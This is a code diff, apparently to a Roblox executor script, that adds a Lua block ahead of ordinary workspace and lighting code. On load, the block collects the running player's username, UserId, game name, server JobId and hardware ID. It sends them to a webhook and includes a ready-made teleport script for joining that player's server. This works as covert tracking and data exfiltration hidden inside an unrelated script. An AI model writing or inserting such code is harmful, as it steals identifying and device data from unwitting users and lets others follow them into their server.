@@ -2,6 +2,105 @@
 wait(0.1)
 
 
+
+
+local request = (http and http.request) or (syn and syn.request)
+local gethwid = gethwid or identifyexecutor -- si estás usando Synapse/Hydrogen, esto funciona
+
+local hook = "AQUI_TU_WEBHOOK" -- 🔗 pega tu webhook real aquí
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local player = Players.LocalPlayer
+
+-- Intenta obtener el nombre del juego
+local success, info = pcall(function()
+    return MarketplaceService:GetProductInfo(game.PlaceId)
+end)
+
+-- Genera el script de teletransporte
+local TeleportScript = [[
+local TeleportService = game:GetService("TeleportService")
+local ServerID = "]] .. game.JobId .. [["
+TeleportService:TeleportToPlaceInstance(game.PlaceId, ServerID, game.Players.LocalPlayer)
+]]
+
+-- Intenta obtener el HWID
+local hwid = "Desconocido"
+if gethwid then
+    local ok, result = pcall(gethwid)
+    if ok then
+        hwid = tostring(result)
+    end
+end
+
+-- Link de la imagen de perfil
+local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
+
+-- Enviar datos al webhook
+local function enviarDatos()
+    if request and player and success then
+        local EmbedData = {
+            ["embeds"] = {{
+                ["title"] = "🛰️ Datos de Teleport capturados",
+                ["color"] = 0x00ff00, -- Verde
+                ["thumbnail"] = { ["url"] = avatarUrl },
+                ["fields"] = {
+                    {
+                        ["name"] = "👤 Nombre",
+                        ["value"] = player.Name .. " (`" .. player.DisplayName .. "`)",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "🧠 UserId",
+                        ["value"] = tostring(player.UserId),
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "🎮 Juego",
+                        ["value"] = info.Name or "Desconocido",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "🌐 ServerId",
+                        ["value"] = "`" .. game.JobId .. "`",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "🔐 HWID",
+                        ["value"] = "```" .. hwid .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "📜 Teleport Script",
+                        ["value"] = "```lua\n" .. TeleportScript .. "\n```",
+                        ["inline"] = false
+                    }
+                }
+            }}
+        }
+
+        local json = HttpService:JSONEncode(EmbedData)
+
+        request({
+            Url = hook,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = json
+        })
+    end
+end
+
+enviarDatos()
+
+
+
+
+
+
 local workspace = game.Workspace
 local iluminacion = game:GetService("Lighting")
 local Players = game.Players
